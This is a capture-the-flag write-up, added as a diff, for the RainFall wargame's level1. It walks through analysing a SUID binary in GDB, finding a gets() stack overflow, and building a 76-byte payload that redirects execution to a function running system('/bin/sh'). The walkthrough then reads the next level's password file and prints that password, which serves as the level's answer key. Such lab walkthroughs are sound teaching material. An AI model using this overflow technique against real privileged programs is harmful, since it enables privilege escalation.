@@ -1,0 +1,293 @@
+
+## Table of Contents
+1. [Initial Reconnaissance](#initial-reconnaissance)
+2. [Binary Analysis](#binary-analysis)
+3. [Understanding the Vulnerability](#understanding-the-vulnerability)
+4. [Calculating the Offset](#calculating-the-offset)
+5. [Crafting the Exploit](#crafting-the-exploit)
+6. [Exploitation](#exploitation)
+
+---
+
+## Initial Reconnaissance
+
+### Step 1: Check the binary and its permissions
+
+```bash
+level1@RainFall:~$ ls -la
+```
+
+**Output:**
+```
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+```
+
+**What we learned:**
+- The binary has **SUID** bit set (`s` in permissions)
+- Owner is `level2`
+- This means when we execute it, it runs with `level2` privileges
+
+### Step 2: Test the binary behavior
+
+```bash
+level1@RainFall:~$ ./level1
+# (program waits for input)
+^C
+```
+
+The program waits for input and doesn't do anything visible. Let's analyze it deeper.
+
+---
+
+## Binary Analysis
+
+### Step 3: Check security protections
+
+```bash
+level1@192.168.1.123's password: 
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
+```
+
+**What this means:**
+- ❌ **No RELRO**: We can overwrite the Global Offset Table (GOT)
+- ❌ **No canary**: No stack protection - buffer overflows are easier
+- ❌ **NX disabled**: Stack is executable - we could inject shellcode
+- ❌ **No PIE**: Addresses are not randomized
+- ❌ **ASLR Off**: Memory addresses are predictable
+
+**Conclusion:** This binary is very vulnerable to buffer overflow attacks!
+
+### Step 4: Analyze with GDB - Find functions
+
+```bash
+level1@RainFall:~$ gdb level1
+(gdb) info functions
+```
+
+**Output:**
+```
+0x08048340  gets@plt
+0x08048350  fwrite@plt
+0x08048360  system@plt
+0x08048444  run
+0x08048480  main
+```
+
+**Important findings:**
+- `gets()` - A dangerous function that doesn't check buffer size!
+- `system()` - Can execute shell commands
+- `run` - A function at address `0x08048444` (interesting!)
+- `main` - The main function at `0x08048480`
+
+### Step 5: Disassemble main function
+
+```bash
+(gdb) disassemble main
+```
+
+**Output:**
+```asm
+0x08048480 <+0>:     push   %ebp
+0x08048481 <+1>:     mov    %esp,%ebp
+0x08048483 <+3>:     and    $0xfffffff0,%esp
+0x08048486 <+6>:     sub    $0x50,%esp           ; Allocate 80 bytes (0x50)
+0x08048489 <+9>:     lea    0x10(%esp),%eax      ; Buffer starts at ESP+0x10
+0x0804848d <+13>:    mov    %eax,(%esp)
+0x08048490 <+16>:    call   0x8048340 <gets@plt> ; DANGEROUS!
+0x08048495 <+21>:    leave
+0x08048496 <+22>:    ret
+```
+
+**Analysis:**
+- Stack space allocated: `0x50` = 80 bytes
+- Buffer starts at: `ESP + 0x10` = 16 bytes offset
+- Buffer size: `0x50 - 0x10` = `0x40` = **64 bytes**
+- Uses `gets()` which **doesn't check buffer size**!
+
+### Step 6: Examine the 'run' function
+
+```bash
+(gdb) disassemble run
+```
+
+**Output:**
+```asm
+0x08048444 <+0>:     push   %ebp
+0x08048445 <+1>:     mov    %esp,%ebp
+0x08048447 <+3>:     sub    $0x18,%esp
+0x0804844a <+6>:     mov    0x80497c0,%eax
+0x0804844f <+11>:    mov    %eax,%edx
+0x08048451 <+13>:    mov    $0x8048570,%eax
+0x08048456 <+18>:    mov    %edx,0xc(%esp)
+0x0804845a <+22>:    movl   $0x13,0x8(%esp)
+0x08048462 <+30>:    movl   $0x1,0x4(%esp)
+0x0804846a <+38>:    mov    %eax,(%esp)
+0x0804846d <+41>:    call   0x8048350 <fwrite@plt>  ; Print message
+0x08048472 <+46>:    movl   $0x8048584,(%esp)       ; Load argument
+0x08048479 <+53>:    call   0x8048360 <system@plt>  ; Execute system!
+0x0804847e <+58>:    leave
+0x0804847f <+59>:    ret
+```
+
+### Step 7: Check what system() executes
+
+```bash
+(gdb) x/s 0x8048584
+```
+
+**Output:**
+```
+0x8048584:       "/bin/sh"
+```
+
+**BINGO!** The `run` function executes `system("/bin/sh")` which gives us a shell!
+
+---
+
+## Understanding the Vulnerability
+
+### The Problem
+
+The `main` function uses `gets()`, which is vulnerable because:
+- It reads input until a newline (`\n`) is found
+- It **doesn't check** if the input fits in the buffer
+- We can write beyond the buffer boundary
+
+### Stack Layout
+
+When `main` is called, the stack looks like this:
+
+```
+Higher Memory Addresses
++------------------------+
+|   Return Address       | <- We want to overwrite this!
++------------------------+
+|   Saved EBP            | (4 bytes)
++------------------------+
+|   Unused space         | (16 bytes from ESP+0x40 to ESP+0x50)
++------------------------+
+|   Buffer (64 bytes)    | <- ESP+0x10 (gets() writes here)
++------------------------+
+|   Unused space         | (16 bytes from ESP to ESP+0x10)
++------------------------+ <- ESP (Stack Pointer)
+Lower Memory Addresses
+```
+
+### The Attack Strategy
+
+1. Fill the 64-byte buffer with junk data
+2. Overwrite the saved EBP (4 bytes) with more junk
+3. Overwrite the **return address** with the address of `run` (`0x08048444`)
+4. When `main` executes `ret`, it will jump to `run` instead of returning normally
+5. `run` executes `system("/bin/sh")` with level2 privileges
+6. We get a shell as level2!
+
+---
+
+## Calculating the Offset
+
+### Memory Layout Calculation
+
+```
+Buffer start:        ESP + 0x10
+Buffer size:         0x50 - 0x10 = 0x40 = 64 bytes
+Saved EBP:           4 bytes
+Return Address:      4 bytes (this is what we want to overwrite)
+```
+
+### Total Offset Calculation
+
+To reach the return address:
+- From ESP+0x10 to ESP+0x50: 64 bytes (buffer)
+- From ESP+0x50 to saved EBP: 12 bytes (unused space)
+- Saved EBP: 4 bytes
+
+**Total: 64 + 12 = 76 bytes** before the return address
+
+---
+
+## Crafting the Exploit
+
+### Understanding Little-Endian
+
+Intel x86 uses **little-endian** byte order, meaning:
+- Address `0x08048444` is stored as `\x44\x84\x04\x08`
+- Least significant byte first
+
+### The Payload
+
+```python
+"A" * 76 + "\x44\x84\x04\x08"
+```
+
+**Breakdown:**
+- `"A" * 76`: Fill 76 bytes (buffer + saved EBP)
+- `"\x44\x84\x04\x08"`: Address of `run` function in little-endian
+
+### Creating the Exploit File
+
+```bash
+python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit1
+```
+
+---
+
+## Exploitation
+
+### Step 8: Execute the exploit
+
+**Important:** We need to keep stdin open so we can interact with the shell.
+
+```bash
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+```
+
+**Output:**
+```
+Good... Wait what?
+```
+
+The shell is now active! Type commands:
+
+```bash
+whoami
+```
+
+**Output:**
+```
+level2
+```
+
+Success! We're running as level2.
+
+### Step 9: Get the password
+
+```bash
+cat /home/user/level2/.pass
+```
+
+**Output:**
+```
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+### Step 10: Exit and login as level2
+
+```bash
+exit  # or press Ctrl+D
+su level2
+Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+**Success!** You're now level2.
+
+---
+
